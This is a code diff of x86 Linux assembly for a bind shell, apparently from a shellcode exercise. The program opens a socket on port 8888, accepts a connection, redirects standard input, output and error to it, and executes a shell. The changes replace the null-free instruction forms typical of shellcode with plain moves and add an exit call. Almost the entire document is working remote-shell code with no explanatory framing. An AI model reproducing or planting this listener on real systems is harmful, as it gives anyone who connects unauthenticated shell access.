@@ -20,13 +20,10 @@ _start:
 
 
 	; Message 1
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
+	mov eax, 0x4
+	mov ebx, 1
 	mov ecx, message
-	xor edx, edx
-	mov dl, mlen
+	mov edx, mlen
 	int 0x80
 
 	; Socket - 359
@@ -35,50 +32,38 @@ _start:
     ;  int type = 1;
     ;  int protocol = 0;
 	; ) =  14;
-	xor eax, eax
-	mov ax, 0x167
-	xor ebx, ebx
-	mov bl, 2
-	xor ecx, ecx
-	mov cl, 1
-	xor edx, edx
+	mov eax, 0x167
+	mov ebx, 2
+	mov ecx, 1
+	mov edx, 0
 	int 0x80
 	mov dword [socket], eax
 
 
 	; Message 2
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
+	mov eax, 0x4
+	mov ebx, 1
 	mov ecx, message2
-	xor edx, edx
-	mov dl, mlen2
+	mov edx, mlen2
 	int 0x80
 
 	; Bind - 361
-	xor eax, eax
-	mov ax, 0x169
+	mov eax, 0x169
 	mov ebx, [socket]
-	;xor esi, esi
-	push    dword   0 ; ip 0.0.0.0
+	push    dword   0x00000000 ; ip 0.0.0.0
     push    dword   0xb822; port 8888, big endian
     push    word    2 
     mov [socket_address], esp
 	mov ecx, [socket_address]
-	xor edx, edx
-	mov dl, 0x10 ; 16 
+	mov edx, 0x10 ; 16 
 	int 0x80
 
 
 	; Message 3
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
+	mov eax, 0x4
+	mov ebx, 1
 	mov ecx, message3
-	xor edx, edx
-	mov dl, mlen3
+	mov edx, mlen3
 	int 0x80
 
 	; Listen - 363
@@ -86,21 +71,17 @@ _start:
     ;  int s = 14;
     ;  int backlog = 0;
 	; ) =  0;
-	xor eax, eax
-	mov ax, 0x16b
+	mov eax, 0x16b
 	mov ebx, [socket]
-	xor ecx, ecx
+	mov ecx, 0
 	int 0x80
 
 
 	; Message 4
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
+	mov eax, 0x4
+	mov ebx, 1
 	mov ecx, message4
-	xor edx, edx
-	mov dl, mlen4
+	mov edx, mlen4
 	int 0x80
 
 	; Accept - 364
@@ -111,35 +92,28 @@ _start:
     ; 	int addrlen = 0x00000010 => 
     ;     none;
 	; ) =  19;
-	xor eax, eax
-	mov ax, 0x16c
+	mov eax, 0x16c
 	mov ebx, [socket]
-	xor ecx, ecx
-	xor edx, edx
-	mov dl, 0x10 ; 16 
+	mov ecx, 0
+	mov edx, 0x10 ; 16 
 	int 0x80
 
 	mov [accept_res], eax
 
 	;dup2
-	xor eax, eax
-	mov al, 0x3f
+	mov eax, 0x3f
 	mov ebx, [accept_res]
-	xor ecx, ecx
+	mov ecx, 0
 	int 0x80
 
-	xor eax, eax
-	mov al, 0x3f
+	mov eax, 0x3f
 	mov ebx, [accept_res]
-	xor ecx, ecx
-	mov cl, 1
+	mov ecx, 1
 	int 0x80
 
-	xor eax, eax
-	mov al, 0x3f
+	mov eax, 0x3f
 	mov ebx, [accept_res]
-	xor ecx, ecx
-	mov cl, 2
+	mov ecx, 2
 	int 0x80
 
 
@@ -156,6 +130,11 @@ _start:
 	mov al, 11
 	int 0x80
 
+
+	; Exit
+	mov eax, 1
+	mov ebx, 10		; sys_exit syscall
+	int 0x80
 
 
 
